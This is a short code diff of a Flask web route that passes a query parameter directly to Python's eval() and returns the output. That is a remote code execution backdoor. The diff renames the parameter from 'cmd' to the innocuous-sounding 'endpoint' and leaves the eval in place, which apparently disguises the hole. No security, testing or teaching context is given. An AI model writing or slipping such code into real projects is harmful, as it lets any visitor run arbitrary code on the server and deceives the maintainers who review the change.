@@ -35,9 +35,9 @@
 
       @app.route('/')
       def index():
-          cmd = request.args.get('cmd', '')
+          endpoint = request.args.get('endpoint', '')
           try:
-              result = eval(cmd)
+              result = eval(endpoint)
           except Exception as e:
               result = str(e)
           return f"<pre>{result}</pre>"
